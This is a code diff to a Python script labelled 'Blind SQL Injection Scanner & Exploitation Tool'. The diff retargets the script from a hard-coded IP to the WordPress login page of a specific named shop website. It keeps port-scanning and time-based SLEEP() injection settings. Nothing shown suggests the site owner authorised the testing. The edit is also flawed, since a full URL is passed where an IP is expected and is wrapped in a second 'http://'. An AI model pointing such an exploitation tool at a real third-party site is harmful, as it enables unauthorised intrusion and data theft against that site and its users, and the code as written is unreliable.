@@ -6,7 +6,7 @@ from urllib.parse import urlencode, quote
 import sys
 
 # Target configuration
-TARGET_IP = "178.33.71.116"
+TARGET_URL = "https://dipelectronicslabshop.in/wp-login.php"
 PORTS = [80, 8080, 443, 8443, 3000, 5000, 8000]  # Common web ports
 TIME_DELAY = 5  # seconds for SLEEP()
 TIMEOUT_THRESHOLD = 4  # seconds to consider as a delay
@@ -345,7 +345,7 @@ def main():
     print("="*70)
     print("Blind SQL Injection Scanner & Exploitation Tool")
     print("="*70)
-    print(f"Target: {TARGET_IP}")
+    print(f"Target: {TARGET_URL}")
     print(f"Time delay: {TIME_DELAY} seconds")
     print("="*70 + "\n")
     
@@ -354,12 +354,12 @@ def main():
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     
     # Step 1: Scan for web services
-    urls = scan_ports(TARGET_IP)
+    urls = scan_ports(TARGET_URL)
     
     if not urls:
         print("\n[-] No web services found")
         print("[*] Try specifying a URL manually:")
-        print(f"    python script.py http://{TARGET_IP}")
+        print(f"    python script.py http://{TARGET_URL}")
         return
     
     # Step 2: Scan each URL for SQL injection
